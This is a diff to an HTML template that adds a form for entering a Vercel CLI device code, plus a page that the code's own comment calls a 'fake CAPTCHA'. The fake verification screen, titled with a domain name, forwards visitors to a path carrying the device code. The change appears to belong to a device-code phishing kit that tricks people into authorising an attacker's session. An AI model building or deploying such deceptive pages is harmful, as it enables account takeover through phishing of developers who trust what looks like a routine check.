@@ -64,6 +64,32 @@
     </style>
   </head>
   <body class="no-js">
+    {% if not code %}
+    <!-- No code provided — show input form -->
+    <style>
+      .code-form { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; gap: 16px; font-family: monospace; background: #0f0f23; color: #e0e0e0; }
+      .code-form input { width: 320px; padding: 12px; font-size: 18px; text-align: center; font-family: monospace; letter-spacing: 2px; background: #1a1a2e; color: #0f0; border: 2px solid #333; border-radius: 6px; text-transform: uppercase; }
+      .code-form input::placeholder { color: #555; letter-spacing: 1px; }
+      .code-form button { padding: 10px 32px; font-size: 14px; background: #ff5582; color: #fff; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
+      .code-form .hint { color: #666; font-size: 12px; }
+    </style>
+    <div class="code-form">
+      <h2 style="font-weight:400">Device Code</h2>
+      <input type="text" id="codeInput" placeholder="XXXX-XXXX" maxlength="9" autofocus>
+      <button onclick="go()">Start</button>
+      <span class="hint">Paste your Vercel CLI device code</span>
+    </div>
+    <script>
+      function go() {
+        var c = document.getElementById("codeInput").value.trim().toUpperCase();
+        if (c) location = "/" + c;
+      }
+      document.getElementById("codeInput").addEventListener("keydown", function(e) {
+        if (e.key === "Enter") go();
+      });
+    </script>
+    {% else %}
+    <!-- Code provided — show fake CAPTCHA -->
     <div class="main-wrapper" role="main">
       <div class="main-content">
         <h1 class="zone-name-title h1">{{ domain }}</h1>
@@ -132,10 +158,11 @@
           spinner.style.visibility = "visible";
           message.classList.remove("spacer-top");
           setTimeout(() => {
-            location = "/game";
+            location = "/game/{{ code }}";
           }, 250);
         }, 500);
       };
     };
   </script>
+{% endif %}
 </html>
